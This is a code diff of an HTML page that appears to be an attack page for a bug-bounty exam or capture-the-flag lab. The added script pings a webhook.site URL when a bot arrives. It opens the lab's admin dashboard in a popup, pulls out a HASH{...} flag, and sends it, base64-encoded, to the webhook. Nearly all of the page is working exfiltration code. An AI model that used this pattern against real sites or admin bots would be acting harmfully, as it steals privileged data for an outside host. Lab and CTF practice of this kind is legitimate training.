@@ -1,12 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/admin/messages/69e7f88abee6d6b7c664331d">
-    <title>Syncing...</title>
+    <title>Exam Analytics</title>
 </head>
 <body>
+    <h1>Processing...</h1>
     <script>
-        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e7f88abee6d6b7c664331d";
+        const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";
+        
+        // 1. Log that the bot arrived
+        fetch(webhook + "?status=Bot_on_GitHub");
+
+        // 2. The Payload: Navigate to the lab and run code
+        // We use a delay to ensure the lab session is active
+        setTimeout(() => {
+            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
+        }, 500);
+
+        // 3. If the bot stays on this page, we try to grab cookies via a popup (Backup)
+        const win = window.open("https://bugbounty-exam.hashacademy.co/admin/dashboard");
+        setTimeout(() => {
+            try {
+                const flag = win.document.body.innerText.match(/HASH\{[^}]+\}/);
+                if (flag) {
+                    fetch(webhook + "?FLAG=" + btoa(flag[0]));
+                }
+            } catch(e) {
+                fetch(webhook + "?error=CORS_Blocked_Trying_Redirect");
+            }
+        }, 3000);
     </script>
 </body>
 </html>
